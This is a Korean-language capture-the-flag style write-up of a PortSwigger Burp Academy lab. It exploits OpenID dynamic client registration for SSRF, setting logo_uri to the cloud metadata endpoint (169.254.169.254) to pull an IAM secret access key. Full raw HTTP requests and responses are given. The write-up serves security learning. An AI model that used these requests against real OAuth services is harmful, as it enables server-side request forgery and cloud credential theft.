---
layout: post
title: "Burp Academy-OAuth 다섯번째 문제: SSRF via OpenID dynamic client registration"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, OAuth취약점]
toc: true
---

# 개요
- OAuth 2.0 인증에 관련된 취약점이다. 
- 취약점 설명 주소: https://portswigger.net/web-security/oauth/openid
- 문제 주소: https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration
- 난이도: PRACTITIONER (보통)

# 문제 설명
- 클라이언트 어플리케이션을 마음대로 등록할 수 있다. 
- client에 대한 데이터가 OAuth 서비스에서 안전하게 사용되고 있지 않다. 따라서 SSRF가 가능하다. 
- SSRF공격을 통해 OAuth관리측에서 `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/`로 접속하도록 만들어서 OAuth 제공자의 클라우드 환경의 억세스키를 얻어내자. 

```
This lab allows client applications to dynamically register themselves with the OAuth service via a dedicated registration endpoint. Some client-specific data is used in an unsafe way by the OAuth service, which exposes a potential vector for SSRF.

To solve the lab, craft an SSRF attack to access http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/ and steal the secret access key for the OAuth provider's cloud environment.

You can log in to your own account using the following credentials: wiener:peter
```

# 풀이 

## 살펴보기
- 이번 문제는 exploit서버가 존재하지 않는다. 
- 이 웹 사이트는 소셜미디어 계정으로 OAuth로그인이 가능하다. 
- 조금 특별한 점은 소셜 미디어 계정로그인 성공후에 /oauth-callback 으로 웹 사이트로 되돌아오는 부분에 code파라메터가 GET요청으로 되어 있다는 점이다. 

```http 
GET /oauth-callback?code=z6sTlfO2JUbBkWSWYme14Q1RppjWxPoRm5wMclA7G8e HTTP/2
Host: 0a5700d603e8bc4e8466454f00f90035.web-security-academy.net
Cookie: session=Ba7grVUdqT8Xk8gxctS0O5SWDXhIH1rc
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://oauth-0a57007b032ebcc384dc434b02d90026.oauth-server.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Te: trailers


```

그리고 로그아웃 후에 다시 로그인을 시도하면 별도로 ID/PW를 물어보지 않고 바로 로그인 된다. 이게 뭔가 힌트가 될지도 모른다. 


## 풀이방법 생각해보기
- 공격목표는 웹사이트의 관리자가 아니라 OAuth 서비스를 제공하는 서버이다. 
- SSRF공격이므로 웹사이트에 OAuth서비스쪽으로 행하는 공격일 것이다. 
- 웹 사이트에서 뭔가 OAuth쪽으로 URL을 던져주는 부분을 찾는다. 
- 조금 살펴봤지만 특별히 보이지 않는다. 
- 아! 클라이언트를 마음대로 등록할 수 있는 부분에서 취약점이 발생한다고 했다. 그렇다면 이 문제 사이트의 OAuth 서비스에는 그런 부분이 존재할 것이다. 그런데 웹 사이트이용중에는 그러한 OAuth클라이언트를 등록하는 부분은 안보인다. 
- 아마 OAuth서비스의 알려진 엔드포인트가 있을 것이다. 

## OAuth 클라이언트를 등록하는 엔드포인트 찾기 
- 몇 가지 테스트를 해본다. /register, /registration, /openid/register, /openid/registration등을 테스트해보자. 
- 음.. 모두 존재하지 않는 엔드포인트이다. 
- 그렇다면 취약점 설명에도 있었던 `/.well-known/openid-configuration`에 접속해본다. 
- 그러자 다음과 같이 각종 정보를 확인할 수 있었다! 

![openid설정정보](/images/burp-academy-oauth-5-1.png)

- 여기에서 OAuth 클라이언트를 등록할 수 있는 정보가 있는지 확인해본다. 

`registration_endpoint` 라는 값이 있었다. 여기가 클라이언트를 등록하는 엔드포인트로 보인다. 값은 `https://oauth-0a4400a30443221683df1da0021700d7.oauth-server.net/reg` 로 되어 있다. 

## 임의의 클라이언트를 등록가능한지 확인해보기 

이 엔드포인트에 POST로 요청을 보내본다. 그러자 다음과 같이 400에러 응답이 회신되었다. 결과 페이지에서 `redirect_uris`라는 값이 필수값이라는 정보를 얻을 수 있었다. 

![등록실패응답페이지](/images/burp-academy-oauth-5-3.png)

그러면 요청헤더에 `Content-Type: application/json`를 추가한다. 그리고 `redirect_uris`의 값을 대충 만들어서 보내본다. 


```json
{
    "redirect_uris": [
        "https://client-app.com/callback",
        "https://client-app.com/callback2"
        ],
}
```

그러면 201 Created 응답이 돌아온다! 이 것으로 이 OAuth사이트에서 임의의 클라이언트를 등록할 수 있게 되었다. 

![201 Created 응답](/images/burp-academy-oauth-5-2.png)

## 다음 단계 
그러면 다음은 어떻게 할까? OAuth 서비스에서 문제에서 주어진 URL `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/`로 접속하도록(SSRF) 만들면 될 것 같다. 아마도 OAuth 서비스에서는 등록된 클라이언트의 redirect_uri에 지정된 URL을 무방비로 접근하는 동작을 하는게 아닐까?

OAuth 클라이언트 등록 요청의 `redirect_uris`를 `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/`로 지정해서 요청을 보내보자. 

```
{
    "redirect_uris": [
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/",
        ],
}
```

다음과 같이 등록에 성공했다. 

```http
POST /reg HTTP/2
Host: oauth-0a4400a30443221683df1da0021700d7.oauth-server.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 126

{
    "redirect_uris": [
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
]
        
}
```

```http
HTTP/2 201 Created
X-Powered-By: Express
Pragma: no-cache
Cache-Control: no-cache, no-store
Content-Type: application/json; charset=utf-8
Date: Mon, 15 May 2023 01:47:32 GMT
Keep-Alive: timeout=5
Content-Length: 918

{"application_type":"web","grant_types":["authorization_code"],"id_token_signed_response_alg":"RS256","post_logout_redirect_uris":[],"require_auth_time":false,"response_types":["code"],"subject_type":"public","token_endpoint_auth_method":"client_secret_basic","introspection_endpoint_auth_method":"client_secret_basic","revocation_endpoint_auth_method":"client_secret_basic","require_signed_request_object":false,"request_uris":[],"client_id_issued_at":1684115252,"client_id":"jCaVVJhHSOY4uvLPdToC1","client_secret_expires_at":0,"client_secret":"ohUE9N74bLga-Zq46lL0zP4R-wm3CB3q8vmL2ocQ-5S9WmaJGMiPOoZnaPcczkbinu0EapujYJch7b6OXpEpgg","redirect_uris":["http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"],"registration_client_uri":"https://oauth-0a4400a30443221683df1da0021700d7.oauth-server.net/reg/jCaVVJhHSOY4uvLPdToC1","registration_access_token":"2aQbulotRSHdIOHvjFSQVyqTrOnNPqVucOmJPQyCoGn"}
```

음.. 그런데 이 이후를 모르겠다. 
음...
음....

IP `169.254.169.254`를 구글에서 검색해보니 "아마존 EC2 등 클라우드 플랫폼에서 VM 인스턴스에 메타데이터를 제공하기 위한 내부 주소" 라고 한다. 즉, OAuth 서비스의 서버내에서 접근가능한 주소라고 생각된다. 

그런데 설령 OAuth 서비스가 위의 주소로 접근했다고 해도, 그 결과를 어떻게 확인할 수 있을까? 

음.. 생각할 수 있는 경우는 등록된 클라이언트 전용 페이지에서 뭔가 볼 수 있지 않을까 하는 경우다. 클라이언트 정보보는 방법을 생각해보자. 

`/.well-known/openid-configuration`에 접속했을 때 얻은 정보와, 위의 클라이언트 등록시의 HTTP응답에서 받은 정보를 조합하면 뭔가 알 수 있을지도 모른다. 

## 클라이언트 정보보기 
결국 `/reg/{CLIENT_ID}` 엔드포인트가 클라이언트 정보라는 것을 알게되어 정보를 얻는데는 성공했지만, 결국 응답에는 클라이언트 등록시에 볼 수 있었던 정보밖에 포함되어 있지 않았다. 

```http
GET /reg/2JE3q79Hp6UsOH4mRfip0 HTTP/2
Host: oauth-0a2b00a703420c0c806a436c02ba0066.oauth-server.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Authorization: Bearer l8ELTeI2erS3pSw8rcZk9NHRUx214UqY_nEdTybVCpx
Accept-Encoding: gzip, deflate
Content-Length: 0


```

```http
HTTP/2 200 OK
X-Powered-By: Express
Pragma: no-cache
Cache-Control: no-cache, no-store
Content-Type: application/json; charset=utf-8
Date: Mon, 15 May 2023 02:52:56 GMT
Keep-Alive: timeout=5
Content-Length: 918

{"application_type":"web","grant_types":["authorization_code"],"id_token_signed_response_alg":"RS256","post_logout_redirect_uris":[],"require_auth_time":false,"response_types":["code"],"subject_type":"public","token_endpoint_auth_method":"client_secret_basic","introspection_endpoint_auth_method":"client_secret_basic","revocation_endpoint_auth_method":"client_secret_basic","require_signed_request_object":false,"request_uris":[],"client_id_issued_at":1684117532,"client_id":"2JE3q79Hp6UsOH4mRfip0","client_secret_expires_at":0,"client_secret":"A27wYVHX-tSgbcnTCdjMixyyCSLwo41PP2koBybLCXdI_jIb_REsA_mhLGRleRvoc8ciDrCftMNVeKWhaQrEjg","redirect_uris":["http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"],"registration_access_token":"l8ELTeI2erS3pSw8rcZk9NHRUx214UqY_nEdTybVCpx","registration_client_uri":"https://oauth-0a2b00a703420c0c806a436c02ba0066.oauth-server.net/reg/2JE3q79Hp6UsOH4mRfip0"}
```


# 답보기 
으으.. 모르겠다. 답을 보자. 

```
1. While proxying traffic through Burp, log in to your own account. Browse to https://oauth-YOUR-OAUTH-SERVER.oauth-server.net/.well-known/openid-configuration to access the configuration file. Notice that the client registration endpoint is located at /reg.

2. In Burp Repeater, create a suitable POST request to register your own client application with the OAuth service. You must at least provide a redirect_uris array containing an arbitrary whitelist of callback URIs for your fake application. For example:
    
    POST /reg HTTP/1.1
    Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
    Content-Type: application/json

    {
        "redirect_uris" : [
            "https://example.com"
        ]
    }

3. Send the request. Observe that you have now successfully registered your own client application without requiring any authentication. The response contains various metadata associated with your new client application, including a new client_id.
    
4. Using Burp, audit the OAuth flow and notice that the "Authorize" page, where the user consents to the requested permissions, displays the client application's logo. This is fetched from /client/CLIENT-ID/logo. We know from the OpenID specification that client applications can provide the URL for their logo using the logo_uri property during dynamic registration. Send the GET /client/CLIENT-ID/logo request to Burp Repeater.

5. In Repeater, go back to the POST /reg request that you created earlier. Add the logo_uri property. Right-click and select "Insert Collaborator payload" to paste a Collaborator URL as its value . The final request should look something like this:
    POST /reg HTTP/1.1
    Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
    Content-Type: application/json

    {
        "redirect_uris" : [
            "https://example.com"
        ],
        "logo_uri" : "https://BURP-COLLABORATOR-SUBDOMAIN"
    }
    
6. Send the request to register a new client application and copy the client_id from the response.

7. In Repeater, go to the GET /client/CLIENT-ID/logo request. Replace the CLIENT-ID in the path with the new one you just copied and send the request.

8. Go to the Collaborator tab dialog and check for any new interactions. Notice that there is an HTTP interaction attempting to fetch your non-existent logo. This confirms that you can successfully use the logo_uri property to elicit requests from the OAuth server.

9. Go back to the POST /reg request in Repeater and replace the current logo_uri value with the target URL:
    "logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"

10. Send this request and copy the new client_id from the response.

11. Go back to the GET /client/CLIENT-ID/logo request and replace the client_id with the new one you just copied. Send this request. Observe that the response contains the sensitive metadata for the OAuth provider's cloud environment, including the secret access key.

12.Use the "Submit solution" button to submit the access key and solve the lab.


```

3번까지는 진행했다. 

4번과정을 깨닫지 못했다. 로고uri가 있었다는 것, 이 것을 악용할 수 있다는 것을 깨닫지 못했다. 

## 답을 보고 풀기 

5번 로고uri를 burp collaborator의 페이로드 URL로 설정한다. 다음과 같다. 문제없이 등록됐다. 

```http
POST /reg HTTP/2
Host: oauth-0a4800c8035868288387f4cf025400da.oauth-server.net
Cookie: _interaction_resume=uV07SPBdCw3WnAMpsiTQk; _session=Xl4vrLAPKwjf6ZFGy53J3; _session.legacy=Xl4vrLAPKwjf6ZFGy53J3
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json

{
  "redirect_uris" : ["https://example.com"],
  "logo_uri": "https://ntkqy7ok1heeqrx9eq0rtwb00r6iuci1.oastify.com"
}
```

클라이언트의 로고를 확인하는 엔드포인트로 요청을 보내본다. 다음과 같이 200응답이 확인된다. 

![클라이언트 logo 확인](/images/burp-academy-oauth-5-4.png)

Burp Collaborator에도 요청이 있다는 것이 확인된다. 이를 통해 로고 확인 요청이 있으면 OAuth 서버에서 해당 로고URL로 접근한다는 것이 확인되었다. 

![Burp Collaborator확인](/images/burp-academy-oauth-5-5.png)

그러면 이제 logo_uri 를 메타정보 확인용 URL로 변경해서 클라이언트를 등록한다. 

```http
POST /reg HTTP/2
Host: oauth-0a4800c8035868288387f4cf025400da.oauth-server.net
Cookie: _interaction_resume=uV07SPBdCw3WnAMpsiTQk; _session=Xl4vrLAPKwjf6ZFGy53J3; _session.legacy=Xl4vrLAPKwjf6ZFGy53J3
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json

{
  "redirect_uris" : ["https://example.com"],
  "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
```

그 후에 등록된 클라이언트의 로고확인 요청을 보내면 OAuth 서버의 시크릿키가 회신된다! 

![OAuth서버의 시크릿키확인](/images/burp-academy-oauth-5-6.png)

확인된 SecretAccessKey의 값을 문제서버에 제출하면 성공했다는 메세지가 뜬다. 

![성공](/images/burp-academy-oauth-5-success.png)